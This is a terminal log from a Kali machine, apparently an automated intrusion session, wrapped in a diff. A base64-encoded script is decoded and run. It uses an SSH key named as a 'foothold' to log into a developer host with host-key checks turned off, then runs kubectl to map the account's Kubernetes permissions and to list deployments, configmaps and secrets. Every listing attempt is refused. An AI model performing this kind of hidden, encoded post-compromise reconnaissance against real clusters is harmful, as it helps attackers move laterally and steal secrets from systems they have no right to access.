@@ -1,0 +1,46 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k08k8s.sh <<'B64EOF'
+> dGltZW91dCA5MCBzc2ggLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIENvbm5lY3RUaW1lb3V0PTEwIC1pIH4vLnNzaC9rZXBsZXJvcHMtZm9vdGhvbGQgLXAgMjIyMiByb3dhbkByb3dhbi1kZXYgJwplY2hvICI9PT0gY2FuLWkgbGlzdCA9PT0iOyBrdWJlY3RsIGF1dGggY2FuLWkgLS1saXN0IC1uIGZpZWxkbGluayAyPiYxIHwgaGVhZCAtNDAKZWNobyAiPT09IGRlcGxveW1lbnRzID09PSI7IGt1YmVjdGwgZ2V0IGRlcGxveSxzdHMscG8sc3ZjLGNtLHNlY3JldCAtbiBmaWVsZGxpbmsgMj4mMSB8IGhlYWQgLTgwCmVjaG8gIj09PSBjb25maWdtYXBzID09PSI7IGt1YmVjdGwgZ2V0IGNtIC1uIGZpZWxkbGluayAtbyBuYW1lIDI+JjEgfCBoZWFkIC00MAplY2hvICI9PT0gc2VjcmV0cyA9PT0iOyBrdWJlY3RsIGdldCBzZWNyZXQgLW4gZmllbGRsaW5rIC1vIG5hbWUgMj4mMSB8IGhlYWQgLTQwCicgMj4mMSB8IGhlYWQgLTIwMAo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k08k8s.sh; bash /tmp/k08k8s.sh; echo DONEMARK_1795208308062$((6*7))
+=== can-i list ===
+Resources                                       Non-Resource URLs                      Resource Names   Verbs
+selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
+selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
+clustertrustbundles.certificates.k8s.io         []                                     []               [get list watch]
+                                                [/.well-known/openid-configuration/]   []               [get]
+                                                [/.well-known/openid-configuration]    []               [get]
+                                                [/api/*]                               []               [get]
+                                                [/api]                                 []               [get]
+                                                [/apis/*]                              []               [get]
+                                                [/apis]                                []               [get]
+                                                [/healthz]                             []               [get]
+                                                [/healthz]                             []               [get]
+                                                [/livez]                               []               [get]
+                                                [/livez]                               []               [get]
+                                                [/openapi/*]                           []               [get]
+                                                [/openapi]                             []               [get]
+                                                [/openid/v1/jwks/]                     []               [get]
+                                                [/openid/v1/jwks]                      []               [get]
+                                                [/readyz]                              []               [get]
+                                                [/readyz]                              []               [get]
+                                                [/version/]                            []               [get]
+                                                [/version/]                            []               [get]
+                                                [/version]                             []               [get]
+                                                [/version]                             []               [get]
+=== deployments ===
+Error from server (Forbidden): deployments.apps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "deployments" in API group "apps" in the namespace "fieldlink"
+Error from server (Forbidden): statefulsets.apps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "statefulsets" in API group "apps" in the namespace "fieldlink"
+Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "pods" in API group "" in the namespace "fieldlink"
+Error from server (Forbidden): services is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "services" in API group "" in the namespace "fieldlink"
+Error from server (Forbidden): configmaps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "configmaps" in API group "" in the namespace "fieldlink"
+Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "secrets" in API group "" in the namespace "fieldlink"
+=== configmaps ===
+Error from server (Forbidden): configmaps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "configmaps" in API group "" in the namespace "fieldlink"
+=== secrets ===
+Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "secrets" in API group "" in the namespace "fieldlink"
